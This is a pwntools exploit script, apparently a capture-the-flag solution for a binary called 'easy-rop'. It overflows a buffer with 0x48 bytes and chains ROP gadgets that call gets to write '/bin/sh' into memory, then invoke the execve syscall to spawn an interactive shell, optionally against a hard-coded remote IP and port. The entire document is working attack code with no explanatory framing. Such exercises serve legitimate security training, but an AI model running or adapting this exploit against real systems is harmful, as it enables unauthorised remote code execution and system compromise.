from pwn import *

binary = "./easy-rop"

server = "65.1.92.179"
port = 49153

context.binary = binary

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	p = remote(server, port)
else:
	p = gdb.debug([binary], gdbscript = 'b *main \n c')

if len(sys.argv) > 2 and sys.argv[2] == 'd':
	context.log_level = 'debug'

e = ELF(binary)
r = ROP(e)

e.checksec()

syscall = 0x004012d3
prax = 0x004175eb
prdi = 0x0040191a
prsi = 0x0040f4be
prdx = 0x0047560e
bss = e.bss()+0x400
gets = 0x00418890

payload = b"A"*0x48
payload += p64(prdi)
payload += p64(bss)
payload += p64(gets)
payload += p64(prdi)
payload += p64(bss)
payload += p64(prsi)
payload += p64(0)
payload += p64(prdx)
payload += p64(0) + p64(0) + p64(0)
payload += p64(prax)
payload += p64(0x3b)
payload += p64(syscall)
p.sendline(payload)

payload = b"/bin/sh\x00"
p.sendline(payload)

p.interactive()